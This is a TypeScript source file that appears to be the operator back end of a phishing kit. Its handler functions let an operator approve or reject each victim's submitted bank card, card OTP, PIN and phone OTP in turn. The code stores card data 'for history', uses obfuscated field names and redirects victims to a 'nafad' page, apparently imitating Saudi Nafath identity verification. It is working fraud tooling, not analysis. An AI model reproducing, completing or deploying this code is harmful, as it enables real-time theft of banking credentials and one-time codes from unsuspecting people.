import { updateApplication } from "./firebase-services"
import type { HistoryEntry } from "./history-helpers"

/**
 * Update history entry status
 */
export async function updateHistoryStatus(
  visitorId: string,
  historyId: string,
  status: "pending" | "approved" | "rejected" | "approved_with_otp" | "approved_with_pin" | "resend",
  history: HistoryEntry[]
): Promise<void> {
  // Find and update the specific history entry
  const updatedHistory = history.map(entry => {
    if (entry.id === historyId) {
      return { ...entry, status }
    }
    return entry
  })
  
  // Update the history in Firebase
  await updateApplication(visitorId, { history: updatedHistory as any })
}

/**
 * Handle card approval
 */
export async function handleCardApproval(
  visitorId: string,
  historyId: string,
  history: HistoryEntry[]
): Promise<void> {
  // Update history status
  await updateHistoryStatus(visitorId, historyId, "approved", history)
  
  // Show OTP dialog
  await updateApplication(visitorId, {
    otpStatus: "show_otp" as any
  })
}

/**
 * Handle card rejection
 */
export async function handleCardRejection(
  visitorId: string,
  historyId: string,
  history: HistoryEntry[]
): Promise<void> {
  // Update history status
  await updateHistoryStatus(visitorId, historyId, "rejected", history)
  
  // Reject card and notify visitor (keep card data for history)
  await updateApplication(visitorId, {
    cardStatus: "rejected"
  })
}

/**
 * Handle OTP approval
 */
export async function handleOtpApproval(
  visitorId: string,
  historyId: string,
  history: HistoryEntry[]
): Promise<void> {
  // Update history status
  await updateHistoryStatus(visitorId, historyId, "approved", history)
  
  // Approve OTP and show PIN dialog
  await updateApplication(visitorId, {
    _v5Status: "approved",
    otpStatus: "show_pin" as any
  })
}

/**
 * Handle OTP rejection
 */
export async function handleOtpRejection(
  visitorId: string,
  historyId: string,
  history: HistoryEntry[]
): Promise<void> {
  // Update history status
  await updateHistoryStatus(visitorId, historyId, "rejected", history)
  
  // Reject OTP and notify visitor
  await updateApplication(visitorId, {
    _v5Status: "rejected"
  })
}

/**
 * Handle phone verification approval
 */
export async function handlePhoneVerificationApproval(
  visitorId: string,
  historyId: string,
  history: HistoryEntry[]
): Promise<void> {
  // Update history status
  await updateHistoryStatus(visitorId, historyId, "approved", history)
  
  // Approve phone verification - visitor will see OTP dialog
  await updateApplication(visitorId, {
    _v4Status: "approved" as any,
    redirectPage: null // Clear any old redirect
  })
}

/**
 * Handle phone verification rejection
 */
export async function handlePhoneVerificationRejection(
  visitorId: string,
  historyId: string,
  history: HistoryEntry[]
): Promise<void> {
  // Update history status
  await updateHistoryStatus(visitorId, historyId, "rejected", history)
  
  // Reject phone verification - close modal and allow re-entry
  await updateApplication(visitorId, {
    _v4Status: "rejected" as any,
    phoneCarrier: "" // Clear carrier to allow re-selection
  })
}

/**
 * Handle phone OTP approval
 */
export async function handlePhoneOtpApproval(
  visitorId: string,
  historyId: string,
  history: HistoryEntry[]
): Promise<void> {
  // Update history status
  await updateHistoryStatus(visitorId, historyId, "approved", history)
  
  // Approve phone OTP and redirect to nafad page
  await updateApplication(visitorId, {
    phoneOtpStatus: "approved" as any,
    redirectPage: "nafad" as any,
    currentStep: "_t6" as any
  })
}

/**
 * Handle phone OTP rejection
 */
export async function handlePhoneOtpRejection(
  visitorId: string,
  historyId: string,
  history: HistoryEntry[]
): Promise<void> {
  // Update history status
  await updateHistoryStatus(visitorId, historyId, "rejected", history)
  
  // Clear phone OTP and reopen dialog
  await updateApplication(visitorId, {
    _v7: "", // phoneOtp
    phoneOtp: "",
    phoneOtpStatus: "show_phone_otp" as any
  })
}

/**
 * Handle phone OTP resend
 */
export async function handlePhoneOtpResend(visitorId: string): Promise<void> {
  await updateApplication(visitorId, {
    _v7: "", // phoneOtp
    phoneOtp: "",
    phoneOtpStatus: "show_phone_otp" as any
  })
}

/**
 * Handle PIN approval
 */
export async function handlePinApproval(
  visitorId: string,
  historyId: string,
  history: HistoryEntry[]
): Promise<void> {
  // Update history status
  await updateHistoryStatus(visitorId, historyId, "approved", history)
  
  // Approve PIN and redirect to phone page
  await updateApplication(visitorId, {
    _v6Status: "approved",
    currentStep: "phone" as any
  })
}

/**
 * Handle PIN rejection
 */
export async function handlePinRejection(
  visitorId: string,
  historyId: string,
  history: HistoryEntry[]
): Promise<void> {
  // Update history status
  await updateHistoryStatus(visitorId, historyId, "rejected", history)
  
  // Reject PIN and notify visitor
  await updateApplication(visitorId, {
    _v6Status: "rejected"
  })
}
